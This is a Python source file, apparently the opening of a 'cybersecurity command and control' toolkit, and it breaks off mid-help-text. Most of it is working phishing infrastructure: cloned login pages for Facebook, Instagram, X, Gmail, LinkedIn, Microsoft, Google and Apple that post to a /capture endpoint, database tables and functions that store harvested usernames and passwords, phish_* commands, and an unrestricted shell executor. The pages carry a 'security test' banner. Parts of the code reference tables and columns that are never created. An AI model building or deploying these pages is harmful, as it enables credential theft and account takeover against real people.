#!/usr/bin/env python3
"""
🦂 SCORPION-EFFECT - Ultimate Multi-Platform Cybersecurity Command & Control Center
Version: 2.0.0
Author: Security Research Team
Description: Complete security toolkit with multi-platform bot integration, 
            advanced network spoofing, social engineering suite, phishing tools,
            and real-time monitoring with Terminal UI
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import paramiko
import stat
import queue
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
import io
import pickle

# Web server for phishing and command interface
from http.server import BaseHTTPRequestHandler, HTTPServer
import socketserver

# Optional imports with fallbacks
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

try:
    from flask import Flask, request, jsonify, render_template_string
    from flask_socketio import SocketIO, emit
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

try:
    import phonenumbers
    PHONENUMBERS_AVAILABLE = True
except ImportError:
    PHONENUMBERS_AVAILABLE = False

# For Google Chat (webhook-based)
GOOGLE_CHAT_AVAILABLE = True

# =====================
# SCORPION GREEN THEME
# =====================
class ScorpionTheme:
    """Scorpion green/black color scheme"""
    
    GREEN_BRIGHT = '\033[92m'
    GREEN_DARK = '\033[32m'
    GREEN_NEON = '\033[38;5;46m'
    GREEN_LIME = '\033[38;5;118m'
    BLACK = '\033[30m'
    DARK_GREEN = '\033[38;5;22m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    
    # Scorpion special effects
    SCORPION = "🦂"
    STINGER = "⚡"
    VENOM = "💚"
    
    @staticmethod
    def color_text(text: str, color: str) -> str:
        return f"{color}{text}{ScorpionTheme.RESET}"
    
    @staticmethod
    def success(text: str) -> str:
        return f"{ScorpionTheme.GREEN_BRIGHT}✅ {text}{ScorpionTheme.RESET}"
    
    @staticmethod
    def error(text: str) -> str:
        return f"{ScorpionTheme.RED}❌ {text}{ScorpionTheme.RESET}"
    
    @staticmethod
    def warning(text: str) -> str:
        return f"{ScorpionTheme.YELLOW}⚠️ {text}{ScorpionTheme.RESET}"
    
    @staticmethod
    def info(text: str) -> str:
        return f"{ScorpionTheme.GREEN_NEON}ℹ️ {text}{ScorpionTheme.RESET}"
    
    @staticmethod
    def venom(text: str) -> str:
        return f"{ScorpionTheme.GREEN_LIME}{ScorpionTheme.VENOM} {text}{ScorpionTheme.RESET}"

Colors = ScorpionTheme

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".scorpion-effect"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "scorpion.db")
LOG_FILE = os.path.join(CONFIG_DIR, "scorpion.log")
REPORT_DIR = "reports"
SCAN_RESULTS_DIR = os.path.join(REPORT_DIR, "scans")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
WEB_UI_DIR = os.path.join(CONFIG_DIR, "web_ui")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
TELEGRAM_SESSION_DIR = os.path.join(CONFIG_DIR, "telegram_session")
SIGNAL_SESSION_DIR = os.path.join(CONFIG_DIR, "signal_session")
SLACK_SESSION_DIR = os.path.join(CONFIG_DIR, "slack_session")
GOOGLE_CHAT_WEBHOOKS_DIR = os.path.join(CONFIG_DIR, "google_chat_webhooks")
WEBHOOKS_DIR = os.path.join(CONFIG_DIR, "webhooks")

# Create directories
for directory in [CONFIG_DIR, REPORT_DIR, SCAN_RESULTS_DIR, PHISHING_DIR,
                  CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR, TRAFFIC_LOGS_DIR,
                  WEB_UI_DIR, WHATSAPP_SESSION_DIR, TELEGRAM_SESSION_DIR,
                  SIGNAL_SESSION_DIR, SLACK_SESSION_DIR, GOOGLE_CHAT_WEBHOOKS_DIR,
                  WEBHOOKS_DIR]:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SCORPION - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("ScorpionEffect")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager for Scorpion-Effect"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self._init_tables()
    
    def _init_tables(self):
        """Initialize all database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                results TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT,
                severity TEXT,
                description TEXT,
                platform TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                platform TEXT NOT NULL,
                sender TEXT,
                message TEXT,
                response TEXT,
                command TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS webhook_endpoints (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                url TEXT NOT NULL,
                platform TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS google_chat_webhooks (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                webhook_url TEXT NOT NULL,
                space_name TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS system_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                connections_count INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        
        # Insert default phishing templates
        self._init_phishing_templates()
    
    def _init_phishing_templates(self):
        """Initialize default phishing templates"""
        templates = {
            "facebook": self._get_facebook_template(),
            "instagram": self._get_instagram_template(),
            "twitter": self._get_twitter_template(),
            "gmail": self._get_gmail_template(),
            "linkedin": self._get_linkedin_template(),
            "microsoft": self._get_microsoft_template(),
            "google": self._get_google_template(),
            "apple": self._get_apple_template()
        }
        
        for platform, html in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (f"{platform}_default", platform, html))
            except Exception as e:
                logger.error(f"Failed to insert template {platform}: {e}")
        
        self.conn.commit()
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Facebook Login</title>
<style>
body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
.login-box { background: white; border-radius: 8px; padding: 20px; width: 350px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
.logo { color: #1877f2; font-size: 40px; text-align: center; margin-bottom: 20px; }
input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; cursor: pointer; }
.warning { margin-top: 20px; padding: 10px; background: #fff3cd; border-radius: 4px; color: #856404; text-align: center; font-size: 12px; }
</style>
</head>
<body>
<div class="login-box">
<div class="logo">facebook</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Instagram Login</title>
<style>
body { font-family: system-ui; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.login-box { background: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 30px; width: 300px; }
.logo { text-align: center; font-size: 50px; margin-bottom: 30px; }
input { width: 100%; padding: 9px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; margin: 5px 0; box-sizing: border-box; }
button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; margin-top: 8px; cursor: pointer; }
.warning { margin-top: 20px; padding: 10px; background: #fff3cd; border-radius: 4px; color: #856404; text-align: center; font-size: 12px; }
</style>
</head>
<body>
<div class="login-box">
<div class="logo">📸 Instagram</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>X / Twitter Login</title>
<style>
body { font-family: system-ui; background: #000000; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #e7e9ea; }
.login-box { background: #000000; border: 1px solid #2f3336; border-radius: 16px; padding: 48px; width: 400px; }
.logo { text-align: center; font-size: 40px; margin-bottom: 30px; }
input { width: 100%; padding: 12px; background: #000000; border: 1px solid #2f3336; border-radius: 4px; color: white; margin: 8px 0; box-sizing: border-box; }
button { width: 100%; padding: 12px; background: #1d9bf0; color: white; border: none; border-radius: 9999px; margin-top: 20px; cursor: pointer; }
.warning { margin-top: 20px; padding: 12px; background: #1a1a1a; border-radius: 8px; text-align: center; font-size: 12px; }
</style>
</head>
<body>
<div class="login-box">
<div class="logo">𝕏</div>
<h2>Sign in to X</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Gmail Sign in</title>
<style>
body { font-family: Roboto, Arial; background: #f0f4f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.login-box { background: white; border-radius: 28px; padding: 48px 40px; width: 400px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
.logo { text-align: center; color: #1a73e8; font-size: 24px; margin-bottom: 30px; }
input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; margin: 10px 0; box-sizing: border-box; }
button { width: 100%; padding: 13px; background: #1a73e8; color: white; border: none; border-radius: 4px; margin-top: 20px; cursor: pointer; }
.warning { margin-top: 20px; padding: 10px; background: #e8f0fe; border-radius: 8px; text-align: center; font-size: 12px; }
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Gmail</div>
<h2>Sign in</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>LinkedIn Login</title>
<style>
body { font-family: system-ui; background: #f3f2f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.login-box { background: white; border-radius: 8px; padding: 40px 32px; width: 350px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
.logo { color: #0a66c2; font-size: 32px; text-align: center; margin-bottom: 24px; }
input { width: 100%; padding: 14px; border: 1px solid #666; border-radius: 4px; margin: 8px 0; box-sizing: border-box; }
button { width: 100%; padding: 14px; background: #0a66c2; color: white; border: none; border-radius: 28px; margin-top: 8px; cursor: pointer; }
.warning { margin-top: 20px; padding: 10px; background: #fff3cd; border-radius: 4px; color: #856404; text-align: center; font-size: 12px; }
</style>
</head>
<body>
<div class="login-box">
<div class="logo">LinkedIn</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_microsoft_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Microsoft Sign in</title>
<style>
body { font-family: 'Segoe UI', system-ui; background: #f3f3f3; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.login-box { background: white; border-radius: 8px; padding: 40px; width: 400px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
.logo { color: #f25022; font-size: 28px; text-align: center; margin-bottom: 30px; }
input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; margin: 10px 0; box-sizing: border-box; }
button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; margin-top: 20px; cursor: pointer; }
.warning { margin-top: 20px; padding: 10px; background: #fff3cd; border-radius: 4px; color: #856404; text-align: center; font-size: 12px; }
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Microsoft</div>
<h3>Sign in</h3>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_google_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Google Account</title>
<style>
body { font-family: Google Sans, Roboto; background: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.login-box { background: white; border-radius: 8px; padding: 48px 40px; width: 450px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
.logo { text-align: center; color: #4285f4; font-size: 32px; margin-bottom: 20px; }
input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; margin: 10px 0; box-sizing: border-box; }
button { width: 100%; padding: 13px; background: #1a73e8; color: white; border: none; border-radius: 4px; margin-top: 20px; cursor: pointer; }
.warning { margin-top: 20px; padding: 10px; background: #e8f0fe; border-radius: 8px; text-align: center; font-size: 12px; }
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Google</div>
<h2>Sign in</h2>
<p>to continue to Google Account</p>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_apple_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Apple ID</title>
<style>
body { font-family: -apple-system, Helvetica; background: #f5f5f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.login-box { background: white; border-radius: 18px; padding: 40px; width: 400px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
.logo { text-align: center; font-size: 50px; margin-bottom: 20px; }
input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 12px; margin: 10px 0; box-sizing: border-box; }
button { width: 100%; padding: 12px; background: #0071e3; color: white; border: none; border-radius: 12px; margin-top: 20px; cursor: pointer; }
.warning { margin-top: 20px; padding: 10px; background: #fff3cd; border-radius: 8px; text-align: center; font-size: 12px; }
</style>
</head>
<body>
<div class="login-box">
<div class="logo">🍎</div>
<h2>Sign in to Apple ID</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def log_command(self, command: str, source: str, platform: str, success: bool, output: str, execution_time: float):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, platform, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (command, source, platform, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_message(self, platform: str, sender: str, message: str, response: str, command: str = None):
        """Log platform message"""
        try:
            self.cursor.execute('''
                INSERT INTO platform_messages (platform, sender, message, response, command)
                VALUES (?, ?, ?, ?, ?)
            ''', (platform, sender, message[:500], response[:1000], command[:200] if command else None))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log message: {e}")
    
    def save_phishing_link(self, link_id: str, platform: str, url: str, qr_path: str = None) -> bool:
        """Save phishing link to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO phishing_links (id, platform, phishing_url, qr_code_path)
                VALUES (?, ?, ?, ?)
            ''', (link_id, platform, url, qr_path))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def update_phishing_clicks(self, link_id: str):
        """Update click count for phishing link"""
        try:
            self.cursor.execute('''
                UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?
            ''', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str, 
                                  ip: str, user_agent: str, additional: str = ""):
        """Save captured credentials"""
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip, user_agent, additional))
            self.conn.commit()
            logger.info(f"Credentials captured for {link_id} from {ip}")
        except Exception as e:
            logger.error(f"Failed to save credentials: {e}")
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get phishing links"""
        try:
            if active_only:
                self.cursor.execute('SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC')
            else:
                self.cursor.execute('SELECT * FROM phishing_links ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                self.cursor.execute('SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC', (link_id,))
            else:
                self.cursor.execute('SELECT * FROM captured_credentials ORDER BY timestamp DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get credentials: {e}")
            return []
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str, platform: str = None):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (threat_type, source_ip, severity, description, platform)
                VALUES (?, ?, ?, ?, ?)
            ''', (threat_type, source_ip, severity, description, platform))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def get_threats(self, limit: int = 50) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to management"""
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes)
                VALUES (?, ?, ?)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Mark IP as blocked"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['phishing_links'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['blocked_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM platform_messages')
            stats['platform_messages'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, platform, success, timestamp, execution_time 
                FROM command_history ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# COMMAND EXECUTOR
# =====================
class CommandExecutor:
    """Execute system commands with timeout and logging"""
    
    @staticmethod
    def execute(cmd: List[str], timeout: int = 60, shell: bool = False) -> Dict[str, Any]:
        """Execute command and return result"""
        start_time = time.time()
        
        try:
            if shell:
                result = subprocess.run(
                    ' '.join(cmd) if isinstance(cmd, list) else cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore'
                )
            else:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore'
                )
            
            execution_time = time.time() - start_time
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'error': None if result.returncode == 0 else result.stderr,
                'exit_code': result.returncode,
                'execution_time': execution_time
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': f"Command timed out after {timeout} seconds",
                'error': 'Timeout',
                'exit_code': -1,
                'execution_time': timeout
            }
        except Exception as e:
            return {
                'success': False,
                'output': str(e),
                'error': str(e),
                'exit_code': -1,
                'execution_time': time.time() - start_time
            }

# =====================
# UNIFIED COMMAND HANDLER
# =====================
class CommandHandler:
    """Unified command handler for all platforms"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.command_history = []
    
    def execute_command(self, command: str, source: str = "local", platform: str = "local") -> Dict[str, Any]:
        """Execute command and return result"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        result = self._dispatch_command(cmd, args)
        execution_time = time.time() - start_time
        
        self.db.log_command(command, source, platform, result.get('success', False), 
                           str(result.get('output', ''))[:5000], execution_time)
        
        result['execution_time'] = execution_time
        return result
    
    def _dispatch_command(self, cmd: str, args: List[str]) -> Dict[str, Any]:
        """Dispatch command to appropriate handler"""
        
        # ==================== SYSTEM COMMANDS ====================
        if cmd in ['help', '?', 'commands']:
            return self._help()
        elif cmd == 'status':
            return self._status()
        elif cmd == 'history':
            return self._history(args)
        elif cmd == 'clear':
            return {'success': True, 'output': 'CLEAR'}
        elif cmd == 'exit':
            return {'success': True, 'output': 'EXIT'}
        
        # ==================== NETWORK COMMANDS ====================
        elif cmd == 'ping':
            return self._ping(args)
        elif cmd == 'scan':
            return self._scan(args)
        elif cmd == 'nmap':
            return self._nmap(args)
        elif cmd == 'traceroute':
            return self._traceroute(args)
        elif cmd == 'whois':
            return self._whois(args)
        elif cmd == 'dig':
            return self._dig(args)
        elif cmd == 'dns':
            return self._dig(args)
        
        # ==================== SOCIAL ENGINEERING ====================
        elif cmd in ['phish', 'phishing']:
            return self._phishing(args)
        elif cmd == 'phish_facebook':
            return self._phish_platform("facebook")
        elif cmd == 'phish_instagram':
            return self._phish_platform("instagram")
        elif cmd == 'phish_twitter':
            return self._phish_platform("twitter")
        elif cmd == 'phish_gmail':
            return self._phish_platform("gmail")
        elif cmd == 'phish_linkedin':
            return self._phish_platform("linkedin")
        elif cmd == 'phish_microsoft':
            return self._phish_platform("microsoft")
        elif cmd == 'phish_google':
            return self._phish_platform("google")
        elif cmd == 'phish_apple':
            return self._phish_platform("apple")
        elif cmd == 'phish_start':
            return self._phish_start(args)
        elif cmd == 'phish_stop':
            return self._phish_stop()
        elif cmd == 'phish_status':
            return self._phish_status()
        elif cmd == 'phish_creds':
            return self._phish_credentials(args)
        
        # ==================== TRAFFIC GENERATION ====================
        elif cmd in ['traffic', 'gen_traffic']:
            return self._generate_traffic(args)
        elif cmd == 'traffic_stop':
            return self._traffic_stop(args)
        elif cmd == 'traffic_status':
            return self._traffic_status()
        
        # ==================== IP MANAGEMENT ====================
        elif cmd == 'add_ip':
            return self._add_ip(args)
        elif cmd == 'block_ip':
            return self._block_ip(args)
        elif cmd == 'list_ips':
            return self._list_ips()
        
        # ==================== SYSTEM INFO ====================
        elif cmd == 'sysinfo':
            return self._sysinfo()
        elif cmd == 'scorpion-strike':
            return self._scorpion_strike()
        elif cmd == 'stinger':
            return self._stinger_status()
        
        # ==================== GENERIC ====================
        else:
            return self._generic(' '.join([cmd] + args))
    
    def _help(self) -> Dict[str, Any]:
        """Get help"""
        help_text = f"""
{Colors.GREEN_BRIGHT}🦂 SCORPION-EFFECT - Command Reference{Colors.RESET}
{Colors.GREEN_DARK}{'='*50}{Colors.RESET}

{Colors.GREEN_NEON}🎯 SOCIAL ENGINEERING:{Colors.RESET}
  phish_facebook     - Generate Facebook phishing link
  phish_instagram    - Generate Instagram phishing link  
  phish_twitter      - Generate Twitter phishing link
  phish_gmail        - Generate Gmail phishing link
  phish_linkedin     - Generate LinkedIn phishing link
  phish_microsoft    - Generate Microsoft phishing link
  phish_google       - Generate Google phishing link
